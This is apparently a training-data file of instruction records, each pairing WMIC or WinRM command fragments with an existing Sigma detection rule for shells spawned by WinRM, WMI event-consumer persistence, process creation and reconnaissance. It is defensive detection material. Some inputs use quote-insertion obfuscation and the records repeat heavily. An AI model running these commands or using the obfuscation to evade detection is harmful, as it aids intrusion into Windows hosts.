{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsmprovhost.exe \\wsmprovhost.exe", "output": "title: Remote PowerShell Session Host Process (WinRM)\nid: 734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8\nstatus: test\ndescription: Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).\nreferences:\n    - https://threathunterplaybook.com/hunts/windows/190511-RemotePwshExecution/notebook.html\nauthor: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019-09-12\nmodified: 2022-10-09\ntags:\n    - attack.execution\n    - attack.lateral-movement\n    - attack.t1059.001\n    - attack.t1021.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wsmprovhost.exe'\n        - ParentImage|endswith: '\\wsmprovhost.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate usage of remote Powershell, e.g. for monitoring purposes.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsmprovhost.exe \\cmd.exe \\sh.exe \\bash.exe \\powershell.exe \\pwsh.exe \\wsl.exe \\schtasks.exe \\certutil.exe \\whoami.exe \\bitsadmin.exe", "output": "title: Suspicious Processes Spawned by WinRM\nid: 5cc2cda8-f261-4d88-a2de-e9e193c86716\nstatus: test\ndescription: Detects suspicious processes including shells spawnd from WinRM host process\nauthor: Andreas Hunkeler (@Karneades), Markus Neis\nreferences:\n    - Internal Research\ndate: 2021-05-20\nmodified: 2022-07-14\ntags:\n    - attack.t1190\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsmprovhost.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate WinRM usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsmprovhost.exe \\cmd.exe \\sh.exe \\bash.exe \\powershell.exe \\pws\\\"h.exe\\\" \\wsl.exe \\schtasks.exe \\certutil.exe \\whoami.exe \\bitsadmin.exe", "output": "title: Suspicious Processes Spawned by WinRM\nid: 5cc2cda8-f261-4d88-a2de-e9e193c86716\nstatus: test\ndescription: Detects suspicious processes including shells spawnd from WinRM host process\nauthor: Andreas Hunkeler (@Karneades), Markus Neis\nreferences:\n    - Internal Research\ndate: 2021-05-20\nmodified: 2022-07-14\ntags:\n    - attack.t1190\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsmprovhost.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate WinRM usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsmprovhost \\cmd \\sh \\bash \\powershell \\pwsh \\wsl \\schtasks \\certutil \\whoami \\bitsadmin", "output": "title: Suspicious Processes Spawned by WinRM\nid: 5cc2cda8-f261-4d88-a2de-e9e193c86716\nstatus: test\ndescription: Detects suspicious processes including shells spawnd from WinRM host process\nauthor: Andreas Hunkeler (@Karneades), Markus Neis\nreferences:\n    - Internal Research\ndate: 2021-05-20\nmodified: 2022-07-14\ntags:\n    - attack.t1190\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsmprovhost.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate WinRM usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsmprovhost.exe \\cmd.exe \\sh.exe \\bash.exe \\powershell.exe \\pwsh.exe \\wsl.exe \\schtasks.exe \\certutil.exe \\whoami.exe \\bitsadmin.exe", "output": "title: Suspicious Processes Spawned by WinRM\nid: 5cc2cda8-f261-4d88-a2de-e9e193c86716\nstatus: test\ndescription: Detects suspicious processes including shells spawnd from WinRM host process\nauthor: Andreas Hunkeler (@Karneades), Markus Neis\nreferences:\n    - Internal Research\ndate: 2021-05-20\nmodified: 2022-07-14\ntags:\n    - attack.t1190\n    - attack.initial-access\n    - attack.persistence\n    - attack.privilege-escalation\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\wsmprovhost.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\sh.exe'\n            - '\\bash.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wsl.exe'\n            - '\\schtasks.exe'\n            - '\\certutil.exe'\n            - '\\whoami.exe'\n            - '\\bitsadmin.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate WinRM usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ActiveScriptEventConsumer CREATE", "output": "title: New ActiveScriptEventConsumer Created Via Wmic.EXE\nid: ebef4391-1a81-4761-a40a-1db446c0e625\nstatus: test\ndescription: Detects WMIC executions in which an event consumer gets created. This could be used to establish persistence\nreferences:\n    - https://twitter.com/johnlatwc/status/1408062131321270282?s=12\n    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-25\nmodified: 2023-02-14\ntags:\n    - attack.persistence\n    - attack.t1546.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'ActiveScriptEventConsumer'\n            - ' CREATE '\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate software creating script event consumers\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ActiveScriptEventConsumer \\\"C\\\"\\\"R\\\"\\\"E\\\"\\\"A\\\"\\\"T\\\"\\\"E\\\"", "output": "title: New ActiveScriptEventConsumer Created Via Wmic.EXE\nid: ebef4391-1a81-4761-a40a-1db446c0e625\nstatus: test\ndescription: Detects WMIC executions in which an event consumer gets created. This could be used to establish persistence\nreferences:\n    - https://twitter.com/johnlatwc/status/1408062131321270282?s=12\n    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-25\nmodified: 2023-02-14\ntags:\n    - attack.persistence\n    - attack.t1546.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'ActiveScriptEventConsumer'\n            - ' CREATE '\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate software creating script event consumers\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "ActiveScriptEventConsumer CREATE", "output": "title: New ActiveScriptEventConsumer Created Via Wmic.EXE\nid: ebef4391-1a81-4761-a40a-1db446c0e625\nstatus: test\ndescription: Detects WMIC executions in which an event consumer gets created. This could be used to establish persistence\nreferences:\n    - https://twitter.com/johnlatwc/status/1408062131321270282?s=12\n    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-06-25\nmodified: 2023-02-14\ntags:\n    - attack.persistence\n    - attack.t1546.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'ActiveScriptEventConsumer'\n            - ' CREATE '\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate software creating script event consumers\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe process call create", "output": "title: New Process Created Via Wmic.EXE\nid: 526be59f-a573-4eea-b5f7-f0973207634d\nrelated:\n    - id: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8 # For suspicious process creation\n      type: derived\nstatus: test\ndescription: Detects new process creation using WMIC via the \"process call create\" flag\nreferences:\n    - https://www.sans.org/blog/wmic-for-incident-response/\n    - https://github.com/redcanaryco/atomic-red-team/blob/84215139ee5127f8e3a117e063b604812bd71928/atomics/T1047/T1047.md#atomic-test-5---wmi-execute-local-process\nauthor: Michael Haag, Florian Roth (Nextron Systems), juju4, oscd.community\ndate: 2019-01-16\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'process'\n            - 'call'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe process ca\\\"ll\\\" create", "output": "title: New Process Created Via Wmic.EXE\nid: 526be59f-a573-4eea-b5f7-f0973207634d\nrelated:\n    - id: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8 # For suspicious process creation\n      type: derived\nstatus: test\ndescription: Detects new process creation using WMIC via the \"process call create\" flag\nreferences:\n    - https://www.sans.org/blog/wmic-for-incident-response/\n    - https://github.com/redcanaryco/atomic-red-team/blob/84215139ee5127f8e3a117e063b604812bd71928/atomics/T1047/T1047.md#atomic-test-5---wmi-execute-local-process\nauthor: Michael Haag, Florian Roth (Nextron Systems), juju4, oscd.community\ndate: 2019-01-16\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'process'\n            - 'call'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe process --call create", "output": "title: New Process Created Via Wmic.EXE\nid: 526be59f-a573-4eea-b5f7-f0973207634d\nrelated:\n    - id: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8 # For suspicious process creation\n      type: derived\nstatus: test\ndescription: Detects new process creation using WMIC via the \"process call create\" flag\nreferences:\n    - https://www.sans.org/blog/wmic-for-incident-response/\n    - https://github.com/redcanaryco/atomic-red-team/blob/84215139ee5127f8e3a117e063b604812bd71928/atomics/T1047/T1047.md#atomic-test-5---wmi-execute-local-process\nauthor: Michael Haag, Florian Roth (Nextron Systems), juju4, oscd.community\ndate: 2019-01-16\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'process'\n            - 'call'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic wmic process call create", "output": "title: New Process Created Via Wmic.EXE\nid: 526be59f-a573-4eea-b5f7-f0973207634d\nrelated:\n    - id: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8 # For suspicious process creation\n      type: derived\nstatus: test\ndescription: Detects new process creation using WMIC via the \"process call create\" flag\nreferences:\n    - https://www.sans.org/blog/wmic-for-incident-response/\n    - https://github.com/redcanaryco/atomic-red-team/blob/84215139ee5127f8e3a117e063b604812bd71928/atomics/T1047/T1047.md#atomic-test-5---wmi-execute-local-process\nauthor: Michael Haag, Florian Roth (Nextron Systems), juju4, oscd.community\ndate: 2019-01-16\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'process'\n            - 'call'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe process create call", "output": "title: New Process Created Via Wmic.EXE\nid: 526be59f-a573-4eea-b5f7-f0973207634d\nrelated:\n    - id: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8 # For suspicious process creation\n      type: derived\nstatus: test\ndescription: Detects new process creation using WMIC via the \"process call create\" flag\nreferences:\n    - https://www.sans.org/blog/wmic-for-incident-response/\n    - https://github.com/redcanaryco/atomic-red-team/blob/84215139ee5127f8e3a117e063b604812bd71928/atomics/T1047/T1047.md#atomic-test-5---wmi-execute-local-process\nauthor: Michael Haag, Florian Roth (Nextron Systems), juju4, oscd.community\ndate: 2019-01-16\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'process'\n            - 'call'\n            - 'create'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe computersystem", "output": "title: Computer System Reconnaissance Via Wmic.EXE\nid: 9d7ca793-f6bd-471c-8d0f-11e68b2f0d2f\nstatus: test\ndescription: Detects execution of wmic utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc.\nreferences:\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-08\nmodified: 2023-02-14\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1047\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'computersystem'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe \"c\"\"o\"\"m\"\"p\"\"u\"\"t\"\"e\"\"r\"\"s\"\"y\"\"s\"\"t\"\"e\"\"m\"", "output": "title: Computer System Reconnaissance Via Wmic.EXE\nid: 9d7ca793-f6bd-471c-8d0f-11e68b2f0d2f\nstatus: test\ndescription: Detects execution of wmic utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc.\nreferences:\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-08\nmodified: 2023-02-14\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1047\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'computersystem'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic wmic computersystem", "output": "title: Computer System Reconnaissance Via Wmic.EXE\nid: 9d7ca793-f6bd-471c-8d0f-11e68b2f0d2f\nstatus: test\ndescription: Detects execution of wmic utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc.\nreferences:\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-08\nmodified: 2023-02-14\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1047\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'computersystem'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe computersystem wmic.exe", "output": "title: Computer System Reconnaissance Via Wmic.EXE\nid: 9d7ca793-f6bd-471c-8d0f-11e68b2f0d2f\nstatus: test\ndescription: Detects execution of wmic utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc.\nreferences:\n    - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-08\nmodified: 2023-02-14\ntags:\n    - attack.discovery\n    - attack.execution\n    - attack.t1047\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'computersystem'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe csproduct", "output": "title: Hardware Model Reconnaissance Via Wmic.EXE\nid: 3e3ceccd-6c06-48b8-b5ff-ab1d25db8c1d\nstatus: test\ndescription: Detects the execution of WMIC with the \"csproduct\" which is used to obtain information such as hardware models and vendor information\nreferences:\n    - https://jonconwayuk.wordpress.com/2014/01/31/wmic-csproduct-using-wmi-to-identify-make-and-model-of-hardware/\n    - https://www.uptycs.com/blog/kuraystealer-a-bandit-using-discord-webhooks\nauthor: Florian Roth (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'csproduct'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\wmic.exe\\\" wmic.exe csproduct", "output": "title: Hardware Model Reconnaissance Via Wmic.EXE\nid: 3e3ceccd-6c06-48b8-b5ff-ab1d25db8c1d\nstatus: test\ndescription: Detects the execution of WMIC with the \"csproduct\" which is used to obtain information such as hardware models and vendor information\nreferences:\n    - https://jonconwayuk.wordpress.com/2014/01/31/wmic-csproduct-using-wmi-to-identify-make-and-model-of-hardware/\n    - https://www.uptycs.com/blog/kuraystealer-a-bandit-using-discord-webhooks\nauthor: Florian Roth (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'csproduct'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic wmic csproduct", "output": "title: Hardware Model Reconnaissance Via Wmic.EXE\nid: 3e3ceccd-6c06-48b8-b5ff-ab1d25db8c1d\nstatus: test\ndescription: Detects the execution of WMIC with the \"csproduct\" which is used to obtain information such as hardware models and vendor information\nreferences:\n    - https://jonconwayuk.wordpress.com/2014/01/31/wmic-csproduct-using-wmi-to-identify-make-and-model-of-hardware/\n    - https://www.uptycs.com/blog/kuraystealer-a-bandit-using-discord-webhooks\nauthor: Florian Roth (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'csproduct'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe csproduct", "output": "title: Hardware Model Reconnaissance Via Wmic.EXE\nid: 3e3ceccd-6c06-48b8-b5ff-ab1d25db8c1d\nstatus: test\ndescription: Detects the execution of WMIC with the \"csproduct\" which is used to obtain information such as hardware models and vendor information\nreferences:\n    - https://jonconwayuk.wordpress.com/2014/01/31/wmic-csproduct-using-wmi-to-identify-make-and-model-of-hardware/\n    - https://www.uptycs.com/blog/kuraystealer-a-bandit-using-discord-webhooks\nauthor: Florian Roth (Nextron Systems)\ndate: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: 'csproduct'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe group", "output": "title: Local Groups Reconnaissance Via Wmic.EXE\nid: 164eda96-11b2-430b-85ff-6a265c15bf32\nstatus: test\ndescription: |\n    Detects the execution of \"wmic\" with the \"group\" flag.\n    Adversaries may attempt to find local system groups and permission settings.\n    The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\n    Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md\nauthor: frack113\ndate: 2021-12-12\nmodified: 2023-02-14\ntags:\n    - attack.discovery\n    - attack.t1069.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: ' group'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic\\\".exe\\\" group", "output": "title: Local Groups Reconnaissance Via Wmic.EXE\nid: 164eda96-11b2-430b-85ff-6a265c15bf32\nstatus: test\ndescription: |\n    Detects the execution of \"wmic\" with the \"group\" flag.\n    Adversaries may attempt to find local system groups and permission settings.\n    The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\n    Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md\nauthor: frack113\ndate: 2021-12-12\nmodified: 2023-02-14\ntags:\n    - attack.discovery\n    - attack.t1069.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: ' group'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic wmic group", "output": "title: Local Groups Reconnaissance Via Wmic.EXE\nid: 164eda96-11b2-430b-85ff-6a265c15bf32\nstatus: test\ndescription: |\n    Detects the execution of \"wmic\" with the \"group\" flag.\n    Adversaries may attempt to find local system groups and permission settings.\n    The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\n    Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md\nauthor: frack113\ndate: 2021-12-12\nmodified: 2023-02-14\ntags:\n    - attack.discovery\n    - attack.t1069.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: ' group'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wmic.exe wmic.exe group", "output": "title: Local Groups Reconnaissance Via Wmic.EXE\nid: 164eda96-11b2-430b-85ff-6a265c15bf32\nstatus: test\ndescription: |\n    Detects the execution of \"wmic\" with the \"group\" flag.\n    Adversaries may attempt to find local system groups and permission settings.\n    The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\n    Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1069.001/T1069.001.md\nauthor: frack113\ndate: 2021-12-12\nmodified: 2023-02-14\ntags:\n    - attack.discovery\n    - attack.t1069.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\wmic.exe'\n        - OriginalFileName: 'wmic.exe'\n    selection_cli:\n        CommandLine|contains: ' group'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \\WMIC.exe qfe", "output": "title: Windows Hotfix Updates Reconnaissance Via Wmic.EXE\nid: dfd2fcb7-8bd5-4daa-b132-5adb61d6ad45\nstatus: test\ndescription: Detects the execution of wmic with the \"qfe\" flag in order to obtain information about installed hotfix updates on the system. This is often used by pentester and attacker enumeration scripts\nreferences:\n    - https://github.com/carlospolop/PEASS-ng/blob/fa0f2e17fbc1d86f1fd66338a40e665e7182501d/winPEAS/winPEASbat/winPEAS.bat\n    - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains: ' qfe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic.exe \"\\WMIC.exe\" \"qfe\"", "output": "title: Windows Hotfix Updates Reconnaissance Via Wmic.EXE\nid: dfd2fcb7-8bd5-4daa-b132-5adb61d6ad45\nstatus: test\ndescription: Detects the execution of wmic with the \"qfe\" flag in order to obtain information about installed hotfix updates on the system. This is often used by pentester and attacker enumeration scripts\nreferences:\n    - https://github.com/carlospolop/PEASS-ng/blob/fa0f2e17fbc1d86f1fd66338a40e665e7182501d/winPEAS/winPEASbat/winPEAS.bat\n    - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains: ' qfe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "wmic \\WMIC qfe", "output": "title: Windows Hotfix Updates Reconnaissance Via Wmic.EXE\nid: dfd2fcb7-8bd5-4daa-b132-5adb61d6ad45\nstatus: test\ndescription: Detects the execution of wmic with the \"qfe\" flag in order to obtain information about installed hotfix updates on the system. This is often used by pentester and attacker enumeration scripts\nreferences:\n    - https://github.com/carlospolop/PEASS-ng/blob/fa0f2e17fbc1d86f1fd66338a40e665e7182501d/winPEAS/winPEASbat/winPEAS.bat\n    - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'wmic.exe'\n        - Image|endswith: '\\WMIC.exe'\n    selection_cli:\n        CommandLine|contains: ' qfe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
